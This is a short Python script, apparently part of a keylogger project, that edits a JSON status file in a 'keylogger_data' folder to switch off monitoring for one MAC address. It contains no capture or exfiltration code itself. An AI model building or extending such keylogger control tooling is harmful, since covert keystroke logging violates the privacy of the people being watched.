import json


def stop(mac):
    with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
        dic_status = json.loads(f.read())
        dic_status[mac] = False
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as file:
            json.dump(dic_status, file)
            print('success')

stop('f8:54:f6:bc:2e:64')